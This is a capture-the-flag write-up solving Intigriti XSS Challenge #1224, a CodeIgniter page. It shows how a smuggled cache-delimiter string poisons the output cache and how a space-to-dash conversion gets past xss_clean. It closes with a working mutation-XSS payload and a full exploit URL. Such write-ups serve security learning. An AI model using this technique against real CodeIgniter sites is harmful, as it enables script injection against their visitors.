# Intigriti XSS Challenge #1224

> Challenge URL https://challenge-1224.intigriti.io/
## Overview
It is a simple page that renders a text, made in `php` + `CodeIgniter`.
## Code review
1. Main logic:
	- The `View` controller handles an HTTP request, retrieves the `title` parameter from the GET request, cleans it from potential security threats, converts it to an ID using the `str2id()` function, and then loads a view with the sanitized title and its corresponding ID.
	- The output view is cached for one minute.
	- The `str2id()` function ensures that a string is suitable for use as an HTML ID by converting it to lowercase (except for the first letter), and replacing spaces with dashes.
```php
<?php

function str2id($str)
{
    if (strstr($str, '"')) {
        die('Error: No quotes allowed in attribute');
    }
    // Lowercase everything except first letters
    $str = preg_replace_callback('/(^)?[A-Z]+/', function($match) {
        return isset($match[1]) ? $match[0] : strtolower($match[0]);
    }, $str);
    // Replace whitespace with dash
    return preg_replace('/[\s]/', '-', $str);
}

class View extends CI_Controller
{
    public function index()
    {
        $this->load->helper('string');
        $this->load->helper('security');
        $this->output->cache(1);

        $title = $this->input->get('title') ?: 'Christmas Fireplace';

        $title = xss_clean($title);
        $id = str2id($title);

        $this->load->view('view', array(
            "id" => $id,
            "title" => $title
        ));
    }
}
```
- Then the sanitized input is inserted in two parts of the page:
```php
<h1><?= htmlspecialchars($title) ?></h1>
[...]
<div class="fireplace" id="<?= $id ?>">
```

Overall the code looks secure, so let's look at how is the cache handled:

- cache write: if a page hasn't been cached yet, a cache file is written locally right before the response is sent to the client
```php
public function _write_cache($output)
{
	[...]
	
	$expire = time() + ($this->cache_expiration * 60);
	// Put together our serialized info.
	$cache_info = serialize(array(
		'expire'	=> $expire,
		'headers'	=> $this->headers
	));
	$output = $cache_info.'ENDCI--->'.$output;

	[...]
}
```

A cache file is composed like this:
```
SERIALIZED_OBJECT + 'ENDCI--->' + HTML_PAGE
```

- cache read: when requesting a cached page, the corresponding cache file is read and split in two parts:
	- the first part is a PHP object containing the document's expiry value
	- the rest is the page that will be sent to the client
```php
public function _display_cache(&$CFG, &$URI)
{
	[...]

	$cache = (filesize($filepath) > 0) ? fread($fp, filesize($filepath)) : '';

	flock($fp, LOCK_UN);
	fclose($fp);

	// Look for embedded serialized file info.
	if ( ! preg_match('/^(.*)ENDCI--->/', $cache, $match))
	{
		return FALSE;
	}

	$cache_info = unserialize($match[1]);
	$expire = $cache_info['expire'];

	$last_modified = filemtime($filepath);
	
	[...]
	
	// Display the cache
	$this->_display(self::substr($cache, self::strlen($match[0])));
}
```

## Exploitation
1. **Cache poisoning**

What happens if I smuggle a `ENDCI--->` into the cache file?

The cache file would look like this:
```
SERIALIZED_OBJECT + 'ENDCI--->' + START_HTML_PAGE + 'ENDCI--->' + END_HTML_PAGE
```
Therefore when requesting the cached page, because of the regex `/^(.*)ENDCI--->/`, the server will return only the part of the page **after the last** `ENDCI--->`, 

for example:
- Non cached response:
```
[...]<div class="fireplace" id="ENDCI--->xss"><div class="bottom"><ul class="ground">[...]
```
- Cached response:
```
xss"><div class="bottom"><ul class="ground">[...]
```

In the **cached** response, the input is reflected directly in the **html context** (not in the attribute like before), this could introduce an XSS vulnerability.


But there's a problem: sending directly `ENDCI--->`  **won't poison** the cache because `xss_clean` will recognize it as an html comment and will encode it.

Fortunately `str2id` converts spacing characters into dashes, I can use this behaviour to bypass `xss_clean`.

By sending `title=ENDCI--%20>`, no malicious input is detected and `ENDCI--->` gets injected into the page.


2. **mXSS**

Now that I can inject HTML outside the attribute context, I have to bypass some obstacles in order to have an XSS:
- `xss_clean` removes dangerous elements and attributes
- `str2id`  converts spaces to dashes, and all uppercase chars to lowercase

After some attempts I came up with the following payload:
`ENDCI-- ><p/title='</noscript><iframe/onload=alert(document.domain)>'>`

Why does this work? 

This is a **Mutation-based XSS (mXSS)**.

The reason this payload bypasses the `xss_clean` function is that **it does not check attribute values** for potential XSS risks, focusing instead on element tags and known dangerous attributes. As a result, it fails to flag this payload as dangerous so it doesn't get sanitized.
However, when the browser processes this malformed HTML, it **misinterprets** the structure and "corrects" it in a way that turns it into a valid executable script. This misinterpretation leads to a cross-site scripting vulnerability, where the injected script gets executed by the browser.

## Full exploit
1. **Poison the cache**: Request the following URL at 1-minute intervals to poison the cache, as it expires after 1 minute: `https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3E%3Cp/title=%27%3C/noscript%3E%3Ciframe/onload=alert(document.domain)%3E%27%3E`
2. **Trigger the XSS**: Once the cache is poisoned, accessing the link will trigger the XSS payload.